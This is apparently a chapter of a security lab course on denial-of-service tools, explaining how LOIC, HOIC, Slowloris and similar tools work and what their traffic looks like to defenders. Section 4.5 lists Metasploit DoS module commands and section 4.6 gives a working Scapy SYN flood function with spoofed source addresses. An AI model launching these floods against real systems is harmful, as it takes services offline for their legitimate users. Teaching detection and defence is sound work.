# Chapter 4 — Attack Simulation Lab: Frameworks & Scripts

> ⚠️ Same rule as Chapter 3: isolated lab only, systems you own, no route to the internet.

This chapter surveys the well-known stress-testing/DoS frameworks that show up constantly in security course material, CTFs, and incident write-ups, so you can recognize their fingerprints. Rather than reproducing full weaponized source for each, this chapter focuses on **what each tool does, how it's configured, and what its traffic looks like** — the information a defender actually needs.

## 4.1 LOIC (Low Orbit Ion Cannon)

- A GUI stress-testing tool (originally built for legitimate network load testing, later popularized by hacktivist campaigns)
- Modes: **Manual** (you pick a target URL/IP), **IRC/HiveMind** (client takes orders from an IRC channel — the basis of early "voluntary botnet" hacktivism), and message-flood variants
- Configurable: target, port, protocol (TCP/UDP/HTTP), thread count, sockets/thread, and "speed" (packets per interval)
- **Fingerprint for defenders:** a burst of near-identical HTTP GET requests or raw TCP/UDP packets from a modest number of source IPs, often with a generic or default User-Agent, sustained at a constant high rate

## 4.2 HOIC (High Orbit Ion Cannon)

A more capable successor to LOIC:

- Supports **multiple target URLs simultaneously** (up to 256)
- **"Booster scripts"** — plugin-like scripts that customize headers, referrers, and User-Agents per target to make traffic look more varied and harder to filter with simple signatures
- HTTP GET/POST flood capability
- User-agent randomization to evade naive User-Agent-based blocking

**Typical configuration workflow:** add target URL(s) → load booster script(s) → set threads/power → launch. **Fingerprint for defenders:** many concurrent HTTP requests across a set of URLs, higher variability in headers than LOIC due to boosters, but still a statistically abnormal concentration of requests per source relative to organic traffic.

## 4.3 Slowloris (Conceptual Walkthrough)

Slowloris is a **low-bandwidth, high-impact** application-layer technique — a single attacker (or a modest botnet) can take down a vulnerable web server without ever exceeding a trickle of bandwidth. Understanding *why* it works matters more than any specific implementation:

1. Open many TCP connections to the target web server.
2. Send a *partial* HTTP request — the request line and a subset of headers, but deliberately never the terminating blank line that signals "request complete."
3. Periodically (every 10–15 seconds) send one more harmless header line to keep the connection alive and reset any idle timeout, without ever finishing the request.
4. Repeat across hundreds of sockets. Each held-open connection consumes one of the server's finite worker threads/connections. Once all workers are pinned waiting for requests that will never complete, the server can't service new, legitimate clients.

**Why it's hard to detect with volume-based defenses:** total bandwidth stays tiny — this is a *connection exhaustion*, not a *bandwidth exhaustion* attack. Detection instead relies on spotting many long-lived connections with abnormally slow or stalled data transfer per client (see Chapter 5–6).

**Primary mitigation:** modern web servers (nginx by default, Apache with `mod_reqtimeout`) enforce a maximum time allowed to receive a complete set of request headers, which neutralizes basic Slowloris.

## 4.4 Slow POST

The same idea applied to the request *body* instead of headers: send a legitimate `Content-Length` for a POST request, then trickle the body in a byte or two at a time. The server allocates a buffer sized for the full request and waits, tying up resources for the duration.

## 4.5 Metasploit DoS Auxiliary Modules

Metasploit ships auxiliary modules purpose-built for **authorized** DoS testing during a penetration test. Usage pattern (module names and workflow are standard, publicly-documented Metasploit Framework content):

```
use auxiliary/dos/tcp/synflood
set RHOST target-ip
set RPORT 80
run

use auxiliary/dos/http/slowloris
set RHOST target-ip
set RPORT 80
run

use auxiliary/dos/ssl/dtls_fragment_overflow
set RHOST target-ip
run

use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
set RHOST target-ip
run
```

These exist so pentesters can validate that a client's DoS defenses (rate limiting, WAF rules, patched SMB stack, etc.) actually work — always under a signed scope-of-work.

## 4.6 Scapy (Python Packet Crafting)

Scapy is a Python library for crafting arbitrary packets — commonly used in security education to *build understanding* of how attacks like SYN floods work at the packet level, since you assemble every field yourself:

```python
from scapy.all import *
import random

def syn_flood(target_ip, target_port, packet_count):
    """SYN flood attack using Scapy — for isolated lab use only."""
    for i in range(packet_count):
        source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        source_port = random.randint(1024, 65535)
        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
        send(packet, verbose=0)
```
The instructional value here is seeing exactly which fields matter (spoofed source IP, randomized source port, SYN flag) — the same fields you'll later look for evidence of in packet captures and NetFlow data.

## 4.7 Other Named Tools You Should Recognize (by name/purpose only)

| Tool | Purpose |
|---|---|
| HULK | HTTP flooding with randomized headers/URLs to evade caching and simple filters |
| Nmap (with DoS NSE scripts) | Authorized DoS-susceptibility testing (see Chapter 3.5) |
| Tsunami / Trinity | Historical Linux-based DDoS agent families, often cited in botnet research |
| Tribe Flood Network (TFN) | Early "voluntary botnet" coordination tool, historically significant in DDoS research |
| RUDY (R-U-Dead-Yet?) | Slow POST-style DoS via long-form field submissions |

Recognizing tool *names and behavior signatures* matters for attribution and for tuning detections — it does not require you to operate any of them outside your lab.

## 4.8 HOIC/LOIC in Practice — What Defenders See

Regardless of which framework generated the traffic, defenders should watch for:

- A statistically abnormal spike in requests-per-second from a set of client IPs
- Requests concentrated on a small number of URLs/endpoints (often resource-heavy ones)
- Repetitive or synthetic-looking header patterns (even with booster randomization, entropy patterns often differ from real browsers)
- A high ratio of incomplete/long-lived connections (Slowloris/Slow POST signature)

Continue to [Chapter 5 — Detection: Reading the Logs](05-detection-log-analysis.md).
